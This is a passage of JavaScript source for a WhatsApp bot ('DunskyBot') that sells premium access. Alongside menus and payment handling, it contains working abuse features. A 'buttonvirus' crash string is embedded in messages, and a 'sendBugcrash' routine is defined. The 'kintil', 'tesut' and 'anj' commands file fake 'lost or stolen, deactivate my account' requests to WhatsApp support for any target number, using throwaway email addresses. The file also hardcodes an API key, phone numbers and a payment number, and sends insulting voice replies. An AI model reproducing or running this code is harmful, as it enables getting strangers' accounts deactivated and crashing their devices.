const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { daily, level, register, afk, reminder, premium, limit, myfunc} = require('./lib')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const parsems = require('parse-ms')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const anon = require('./lib/menfess')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())
const nokebal = JSON.parse(fs.readFileSync('./database/nokebal.json').toString())
const { makeid } = require("./tools/func_Server")
const setting = JSON.parse(fs.readFileSync('./config.json'))
const mod = JSON.parse(fs.readFileSync('./database/moderator.json').toString())
const team = JSON.parse(fs.readFileSync('./database/team.json').toString())
//const prem = JSON.parse(fs.readFileSync('./database/premium.json').toString())
const _premium = JSON.parse(fs.readFileSync('./database/prem.json'))
//const _daily = JSON.parse(fs.readFileSync('./database/daily.json'))
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))
//const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const _pengguna = JSON.parse(fs.readFileSync('./database/pengguna.json'))
//const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json').toString())
//const pendaftar = JSON.parse(fs.readFileSync('./database/user.json').toString())
const ban = JSON.parse(fs.readFileSync('./database/banned.json').toString())
const msgFilter = require("./lib/func_Spam");
const { processTime, createSerial, zsleep } = require('./tools')
let orang_spam = []
const limitCount = 3
const { ind, eng } = require('./message/text/lang/');
const { M } = require('human-readable');
premium.expiredCheck(_premium)

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'El dunsky'
global.qris = fs.readFileSync(`./image/qris.png`)
global.ownerNumber = ["0@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
    premium: 'MAAF NOMOR INI BELUM *PREMIUM* ! SILAHKAN CHAT OWNER UNTUK UPGRADE PREMIUM AGAR MENDAPATKAN LIMIT TANPA BATAS :D',
    limit : '*MOHON MAAF LIMIT ANDA SUDAH HABIS, UNTUK BISA MENGGUNAKAN BOT KEMBALI, SILAHKAN BELI LIMIT ATAU BERLANGGANAN PREMIUM.\n\n~Terima Kasih',
    moderator : 'MOHON MAAF KAMU BUKAN MODERATOR DUNSKYBOT'
}

module.exports = dunsky = async (dunsky, dunskybot, chatUpdate, store) => {
try {
        const body = (dunskybot.mtype === 'conversation') ? dunskybot.message.conversation : (dunskybot.mtype == 'imageMessage') ? dunskybot.message.imageMessage.caption : (dunskybot.mtype == 'videoMessage') ? dunskybot.message.videoMessage.caption : (dunskybot.mtype == 'extendedTextMessage') ? dunskybot.message.extendedTextMessage.text : (dunskybot.mtype == 'buttonsResponseMessage') ? dunskybot.message.buttonsResponseMessage.selectedButtonId : (dunskybot.mtype == 'listResponseMessage') ? dunskybot.message.listResponseMessage.singleSelectReply.selectedRowId : (dunskybot.mtype == 'templateButtonReplyMessage') ? dunskybot.message.templateButtonReplyMessage.selectedId : (dunskybot.mtype === 'messageContextInfo') ? (dunskybot.message.buttonsResponseMessage?.selectedButtonId || dunskybot.message.listResponseMessage?.singleSelectReply.selectedRowId || dunskybot.text) : ''
        const budy = (typeof dunskybot.text == 'string' ? dunskybot.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(dunskybot.message)
        const { type, quotedMsg, mentioned, now, fromMe } = dunskybot
        const isCmd = body.startsWith(prefix)
        const from = dunskybot.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = dunskybot.pushName || "No Name"
        const botNumber = await dunsky.decodeJid(dunsky.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(dunskybot.sender)
        const isModerator = [botNumber, ...mod].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(dunskybot.sender)
        const itsMe = dunskybot.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = dunskybot.quoted ? dunskybot.quoted : dunskybot
        const mime = (quoted.msg || quoted).mimetype || ''
        const time = moment.tz('Asia/Jakarta').format('DD/MM/YY HH:mm:ss')
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = dunskybot.isGroup ? (dunskybot.key.participant ? dunskybot.key.participant : dunskybot.participant) : dunskybot.key.remoteJid
        const isGroup = dunskybot.chat.endsWith('@g.us')
        const groupMetadata = dunskybot.isGroup ? await dunsky.groupMetadata(dunskybot.chat).catch(e => {}) : ''
        const groupName = dunskybot.isGroup ? groupMetadata.subject : ''
        const participants = dunskybot.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = dunskybot.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = dunskybot.isGroup ? groupMetadata.owner : ''
        const groupMembers = dunskybot.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = dunskybot.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = dunskybot.isGroup ? groupAdmins.includes(dunskybot.sender) : false
    	const isAdmins = dunskybot.isGroup ? groupAdmins.includes(dunskybot.sender) : false
        const isPremium = premium.checkPremiumUser(dunskybot.sender, _premium)
        //const isRegistered = register.checkRegisteredUser(dunskybot.sender, _registered)
        const ar = args.map((v) => v.toLowerCase())
    	//const isPrem = prem.includes(sender)
    	//const isUser = _pengguna.includes(sender)
        const isPengguna = register.checkRegisteredUser(dunskybot.sender, _pengguna)
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[dunskybot.sender]
if (typeof user !== 'object') global.db.users[dunskybot.sender] = {}
const chats = global.db.chats[dunskybot.chat]
if (typeof chats !== 'object') global.db.chats[dunskybot.chat] = {}
} catch (err) {
console.error(err)
}

if (!dunsky.public) {
if (!dunskybot.key.fromMe) return
}

if (!dunskybot.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(dunskybot.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (dunskybot.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(dunskybot.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(dunskybot.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(dunskybot.sender, orang_spam)
var text_ny =`BOT JANGAN DI SPAM KONTOL`
var tts_nya = `https://saipulanuar.ga/api/text-to-audio/tts?text=${text_ny}&idbahasa=id&apikey=jPHjZpQF`
dunsky.sendMessage(from, {audio:{url:tts_nya}, mimetype:'audio/mpeg', ptt:true}, {quoted: dunskybot})
}
const spamgr = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(dunskybot.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(dunskybot.sender, orang_spam)
var text_ny =`BOT JANGAN DI SPAM KONTOL`
var tts_nya = `https://saipulanuar.ga/api/text-to-audio/tts?text=${text_ny}&idbahasa=id&apikey=jPHjZpQF`
dunsky.sendMessage(from, {audio:{url:tts_nya}, mimetype:'audio/mpeg', ptt:true}, {quoted: dunskybot})
}

if (isCmd && msgFilter.isFiltered(dunskybot.sender) && !dunskybot.isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(dunskybot.sender) && dunskybot.isGroup) return spamgr()
if (isCmd && args.length < 1 && !itsMediablo) msgFilter.addFilter(dunskybot.sender)



if (dunskybot.sender.startsWith('212')) return dunsky.updateBlockStatus(dunskybot.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

async function replyprem(teks) {
    let buttons = [
    {buttonId: `${prefix}belipremium`, buttonText: {displayText: 'BUY PREMIUM'}, type: 1},
    ]
    return dunsky.sendButtonText(m.chat, buttons, teks, `Harap Chat Owner jika ingin menjadi Premium`, m)
}

const reply = (teks) => {
    dunsky.sendMessage(from, { text: teks , 
    contextInfo:{
    forwardingScore: 9999999, 
    isForwarded: true
    }
    }, { quoted : dunskybot })
    }
const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}
function mentions(teks, mems = [], id) {
    if (id == null || id == undefined || id == false) {
    let res = dunsky.sendMessage(from, { text: teks, mentions: mems })
    return res
    } else {
    let res = dunsky.sendMessage(from, { text: teks, mentions: mems }, { quoted: dunskybot })
    return res
    }
    }
    async function daftar(teks) {
        let buttons = [
        {buttonId: `${prefix}verify`, buttonText: {displayText: 'DAFTAR DUNSKYBOT'}, type: 1},
        ]
        return dunsky.sendButtonText(dunskybot.chat, buttons, teks, `~DunskyBot`, dunskybot)
    }

if (command) {
dunsky.readMessages([dunskybot.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return dunsky.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `dunsky`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
let cekUser = (satu, dua) => { 
    let x1 = false
    Object.keys(_pengguna).forEach((i) => {
    if (_pengguna[i].id == dua){x1 = i}})
    if (x1 !== false) {
    if (satu == "id"){ return _pengguna[x1].id }
    if (satu == "name"){ return _pengguna[x1].name }
    if (satu == "seri"){ return _pengguna[x1].serial }
    if (satu == "moderator"){ return _pengguna[x1].moderator }
    }
    if (x1 == false) { return null } 
    }
    let cekPremi = (satu, dua) => { 
        let x1 = false
        Object.keys(_premium).forEach((i) => {
        if (_premium[i].id == dua){x1 = i}})
        if (x1 !== false) {
        if (satu == "id"){ return _premium[x1].id }
        if (satu == "expired"){ return _premium[x1].expired }
        }
        if (x1 == false) { return null } 
        }
    let setUser = (satu, dua, tiga) => { 
        Object.keys(_pengguna).forEach((i) => {
        if (_pengguna[i].id == dua){
        if (satu == "±id"){ _pengguna[i].id = tiga
        fs.writeFileSync('./database/pengguna.json', JSON.stringify(_pengguna))} 
        if (satu == "±name"){ _pengguna[i].name = tiga 
        fs.writeFileSync('./database/pengguna.json', JSON.stringify(_pengguna))} 
        if (satu == "±seri"){ _pengguna[i].seri = tiga 
        fs.writeFileSync('./database/pengguna.json', JSON.stringify(_pengguna))} 
        if (satu == "±moderator"){ _pengguna[i].moderator = tiga 
        fs.writeFileSync('./database/pengguna.json', JSON.stringify(_pengguna))}
        }})
        }

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return dunsky.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
    case 'owner':{
        dunsky.sendContact(dunskybot.chat, owner, dunskybot)
        }
        break
    case 'menu':
            case 'help':
                const jumlahUser = _pengguna.length
                const jumlahLimit = limit.getLimit(from, _limit, limitCount)
                const namanya = cekUser("name", sender)
                if (!isPengguna) return daftar(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
                if (args[0] === '1') {
                    return reply(ind.menuDownloader())
                } else if (args[0] === '2') {
                    return reply(ind.menuBot())
                } else if (args[0] === '3') {
                    return reply(ind.menuMisc())
                } else if (args[0] === '4') {
                    return reply(ind.menuSticker())
                } else if (args[0] === '5') {
                    return reply(ind.menuWeeaboo())
                } else if (args[0] === '6') {
                    return reply(ind.menuFun())
                } else if (args[0] === '7') {
                    return reply(ind.menuModeration())
                } else if (args[0] === '8') {
                    if (isGroupMsg && !isNsfw) return reply(ind.notNsfw(), id)
                    return reply(ind.menuNsfw())
                } else if (args[0] === '9') {
                    if (!isOwner) return reply(ind.ownerOnly())
                    return reply(ind.menuOwner())
                } else {
                    let nbuttons = [
                        //{ buttonId: `#limit`, buttonText: { displayText: 'CEK LIMIT' }, type: 1 },
                        { buttonId: `#belipremium`, buttonText: { displayText: 'BELI PREMIUM' }, type: 1 },
                        { buttonId: `#linkgrup`, buttonText: { displayText: 'LINK GROUP' }, type: 1 }
                        ]
                    //return reply(ind.menu(jumlahUser, pushname, isPremium ? 'YES' : 'NO'))
                    return dunsky.sendButtonText(dunskybot.chat, nbuttons, ind.menu(jumlahUser, pushname, isPremium ? 'YES' : 'NO', itsMediablo ? 'Unlimited': isPremium ? 'Unlimited' : jumlahLimit), dunsky.user.name, dunskybot)
                }
                break
                break
                case 'belipremium':{
                    const seactiones = [
                    {
                    title: `DURASI`,
                    rows: [
                    {title: `1 MINGGU`, rowId: `${prefix}premdun 1minggu`},
                    {title: `1 BULAN`, rowId: `${prefix}premdun 1bulan`},
                    {title: `3 BULAN`, rowId: `${prefix}premdun 3bulan`},
                    ]
                    }
                    ]
                    const listSw = { 
                    text: `Hai Kak ${pushname}, Mau berlangganan Premium?\n`,
                    mentions: [sender],
                    footer: `Silahkan Pencet Tombol Di Bawah Ya Kak`,
                    buttonText: 'LANGGANAN PREMIUM',
                    sections: seactiones,
                    listType: 1}
                    dunsky.sendMessage(from, listSw, { quoted: dunskybot })
                    }
                    break
                    case 'premdun':
                    if (args[0] === '1minggu') {
                        let nbuttons = [
                            { buttonId: `#bayar`, buttonText: { displayText: 'PEMBAYARAN' }, type: 1 },
                            ]
                        return dunsky.sendButtonText(dunskybot.chat, nbuttons, `*❏ ORDER PAKET PREMIUM 1 MINGGU ❏*\n\nHarga: *Rp. 20.000*\n`, `Silahkan klik tombol dibawah untuk melakukan pembayaran`, dunskybot)
                    } else if (args[0] === '1bulan') {
                        let nbuttons = [
                            { buttonId: `#bayar`, buttonText: { displayText: 'PEMBAYARAN' }, type: 1 },
                            ]
                        return dunsky.sendButtonText(dunskybot.chat, nbuttons, `*❏ ORDER PAKET PREMIUM 1 BULAN ❏*\n\nHarga: *Rp. 30.000*\n`, `Silahkan klik tombol dibawah untuk melakukan pembayaran`, dunskybot)
                    } else if (args[0] === '3bulan') {
                        let nbuttons = [
                            { buttonId: `#bayar`, buttonText: { displayText: 'PEMBAYARAN' }, type: 1 },
                            ]
                        return dunsky.sendButtonText(dunskybot.chat, nbuttons, `*❏ ORDER PAKET PREMIUM 3 BULAN ❏*\n\nHarga: *Rp. 50.000*\n`, `Silahkan klik tombol dibawah untuk melakukan pembayaran`, dunskybot)
                    }
                    break
                    case 'buypremium':
                        if (!isPremium) return replyprem(mess.premium)
                        if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
                        reply('NOMOR KAMU SUDAH PREMIUM!!! GUNAKAN BOT DENGAN BIJAK :D')
                    break
                    case 'bayar': case 'pembayaran':{
                        let nbuttons = [
                            {buttonId: `${prefix}owner`, buttonText: {displayText: 'CHAT OWNER'}, type: 1},
                            ]
                        let buttonMessaage = {
                                image: global.qris, 
                                //jpegThumbnail: await genProfile(diablo, m),
                                caption: `Hai Kak @${sender.split("@")[0]} Mau ${command}?\n\nSilahkan Scan Qris Di Atas Ya Kak\nAtau Juga Bisa Isi Nomor Payment Di Bawah Ya\n\nDana : 082124154267\n\n_Jika Sudah Melakukan Transfer Harap Kirim Bukti Dengan Cara Mengirim Screenshot Dengan Caption:_\n#bukti\n\nContohnya sebagai berikut:\nhttps://telegra.ph/file/2cf90a7b1e7b2554436cd.jpg`,
                                mentions: [sender],
                            footer: `JIKA TIDAK MENGERTI, BISA TANYAKAN KEPADA OWNER`,
                            buttons: nbuttons,
                            }    
                        dunsky.sendMessage(from, buttonMessaage, { quoted: dunskybot })
                        }
                        break
                        case 'bukti':
    //await dunsky.downloadAndSaveMediaMessage(quoted, `./transaksi/BuktiTransfer/${sender.split('@')[0]}.jpg`)
let depot = sender.split("@")[0]
let catatnya = text.split("|")[1]
let ownerni = `${owner}@s.whatsapp.net`
let bukti = `*─ 「 Pembayaran User 」 ─*
     
_Berikut Adalah Bukti Beli Dari User_

_》Id : @${sender.replace("@s.whatsapp.net", "")}_
_》Catatan : ${catatnya}_

Silahkan Segera Melakukan Premium User Jika Bukti Sudah Benar!.`
let media = await quoted.download()
reply('Sukses kirim ke owner bot')
//let iya_bang = fs.readFileSync(`./transaksi/BuktiTransfer/${sender.split('@')[0]}.jpg`)
//let encmedia = await dunsky.sendImage(`62895600000048@s.whatsapp.net`, media, `Bukti Dari: ${sender.replace("@s.whatsapp.net", "")}`, m)
let buttonnya = [
{ buttonId: prefix+`premium add ${depot} 30d`, buttonText: { displayText: 'PREMIUMKAN 30 HARI' }, type: 1 },
{ buttonId: prefix+`premyes ${depot}|${dunskybot.sender}`, buttonText: { displayText: 'SETUJUI' }, type: 1 },
{ buttonId: prefix+`premno ${depot}|${dunskybot.sender}`, buttonText: { displayText: 'TOLAK' }, type: 1 },
]
let bukti_tf = {
    image: media,
    caption: bukti,
    title: 'bukti pembayaran',
    footer: 'Press The Button Below',
    buttons: buttonnya,
    headerType: 5 
    }
for (let i of team) {
    dunsky.sendMessage(i + "@s.whatsapp.net", bukti_tf, {quoted: dunskybot})
}
break
case 'premyes':
if (!isModerator) reply(mess.owner)		
let siapah = text.split("|")[1]
reply('Sukses Terikim')
let nbuttons = [
    { buttonId: `#cekpremium`, buttonText: { displayText: 'CEK PREMIUM' }, type: 1 },
{ buttonId: `#owner`, buttonText: { displayText: 'CHAT OWNER' }, type: 1 }
]
dunsky.sendButtonText(`${siapah}`, nbuttons, `Anda Telah Berhasil Menjadi *Premium*, Dengan Mudah Hanya Di DunskyBot!\n\nKlik CEK PREMIUM untuk cek durasi premium anda\nKalau ada Kendala tekan chat owner, jangan lupa SAVE NOMOR OWNER agar mendapatkan Update Info Bot.\n~Terima kasih`, dunsky.user.name, dunskybot)
break
case 'renairu':
    //await diablo.downloadAndSaveMediaMessage(quoted, `./transaksi/BuktiTransfer/${sender.split('@')[0]}.jpg`)
let depot_reinaru = sender.split("@")[0]
let catatnya_reinaru = text.split("|")[1]
//let ownerni_reinaru = `${owner}@s.whatsapp.net`
let bukti_reinaru = `*─ 「 Pembayaran User 」 ─*
     
_Berikut Adalah Bukti Beli Dari User_

_》Id : @${sender.replace("@s.whatsapp.net", "")}_
_》Catatan : ${catatnya_reinaru}_

Silahkan Segera Melakukan Premium User Jika Bukti Sudah Benar!.`
let media_reinaru = await quoted.download()
reply('Sukses kirim ke owner bot')
//let iya_bang = fs.readFileSync(`./transaksi/BuktiTransfer/${sender.split('@')[0]}.jpg`)
//let encmedia = await diablo.sendImage(`62895600000048@s.whatsapp.net`, media, `Bukti Dari: ${sender.replace("@s.whatsapp.net", "")}`, m)
let buttonnyaa = [
{ buttonId: prefix+`premium add ${depot_reinaru} 30d`, buttonText: { displayText: 'PREMIUMKAN 30 HARI' }, type: 1 },
{ buttonId: prefix+`premyes ${depot_reinaru}|${dunskybot.sender}`, buttonText: { displayText: 'SETUJUI' }, type: 1 },
{ buttonId: prefix+`premno ${depot_reinaru}|${dunskybot.sender}`, buttonText: { displayText: 'TOLAK' }, type: 1 },
]
let bukti_tfreinaru = {
    image: media_reinaru,
    caption: bukti_reinaru,
    title: 'bukti pembayaran',
    footer: 'Press The Button Below',
    buttons: buttonnyaa,
    headerType: 5 
    }
for (let i of mod) {
    dunsky.sendMessage('6282183526140@s.whatsapp.net', bukti_tfreinaru, {quoted: dunskybot})
}
break
case 'linkgrup':
    if (!isPremium) return replyprem(mess.premium)
    reply(`Link Group DunskyBot Premium :\n\nhttps://chat.whatsapp.com/Kn5pbROAIUa2w4VNctiIng`)
break
case 'premno':
if (!isModerator) reply(mess.owner)
let siape = text.split("|")[1]
reply('Deposit Tidak Akan Dilanjutkan')
dunsky.sendMessage(`${siape}`, {text: `*Pembayaran Anda Ditolak!*\nMungkin Anda Tidak Mengirim Uang Atau Kekeliruan Lain, Silahkan Chat Owner Jika Ada Masalah!.` })
break
case 'verify':
    //if (isGroup) return dunskybot.reply(`DAFTAR LEWAT PRIVATE CHAT`)
var yyyyygygy_xxx = 'Lu Udah Verifikasi, jangan ketik lagi ya kontol'
var vvv_udah = `https://saipulanuar.ga/api/text-to-audio/tts?text=${yyyyygygy_xxx}&idbahasa=id&apikey=jPHjZpQF`
if (cekUser("id", sender) !== null) return dunsky.sendMessage(from, {audio:{url:vvv_udah}, mimetype:'audio/mpeg', ptt:true}, {quoted: dunskybot})
var res_us = `${makeid(10)}`
var user_name = `#DUNS-${makeid(5)}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "time": time, "moderator": false }
_pengguna.push(object_user)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(_pengguna, 2, null))
mentions(`*Memuat Data* › @${sender.split("@")[0]}`, [from])
await sleep(2000)
var verify_teks =`*───「 TERVERIFIKASI 」────*

ꔮ *Number :* @${sender.split('@')[0]}
ꔮ *Name :* ${user_name}
ꔮ *Seri :* ${res_us}
ꔮ *Waktu pendaftaran :* ${time}

_Silahkan ketik *#menu*_
_Untuk menampilkan fitur._`
reply(verify_teks)
await sleep(2000)
var teksss_verify =`*REGISTER-USER*
• *ID:* @${sender.split('@')[0]}
• *Seri:* ${res_us}
• *Name:* ${user_name}
• *Waktu pendaftaran:* ${time}
• *Terdaftar:* ${_pengguna.length}`
dunsky.sendMessage(`6281286696149@s.whatsapp.net`, {text:teksss_verify},{quoted: dunskybot})
console.log(color('[REGISTER]'), color(time, 'yellow'), 'Seri:', color(res_us, 'cyan'), 'Username:', color(user_name, 'cyan'))
break
case 'linkgrup':
    if (!isPremium) return replyprem(mess.premium)
    reply(`Link Group DunskyBot Premium :\n\nhttps://chat.whatsapp.com/LmT0RWBhdJH5uGppAtYfse`)
break
case 'pler' :
    reply(`FITUR INI SEDANG DALAM MASA PERBAIKAN`)
break
case 'kintil': {
    num = `${q}`+'@s.whatsapp.net'
    anj = q.replace(/[^0-9]/g, '')
    // if (!isGroup) return dunskybot.reply(`Bot ini khusus untuk di dalam Grup`)
    if (!isPremium) return dunskybot.reply(`HUBUNGI ADMIN JIKA INGIN PREMIUM`)
    let cekno = await dunsky.onWhatsApp(num)
    let ownernya = owner + '@s.whatsapp.net'
        if (cekno.length == 0) return dunskybot.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
        if (num === dunskybot.sender) return dunskybot.reply(`Tidak Bisa Santet ke Nomor Sendiri!!!`)
        if (num === botNumber) return dunskybot.reply(`Tidak Bisa santet Ke Nomor bot!!!`)
        if (num === ownernya) return dunskybot.reply(`MAU NGAPAIN NYANTET OWNER GOBLOOGGG`)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", anj)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
dunskybot.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case 'tesut': {
    // if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
dunskybot.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case 'anj': {
    if (!isPremium) return dunskybot.reply(`HUBUNGI ADMIN JIKA INGIN PREMIUM`)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
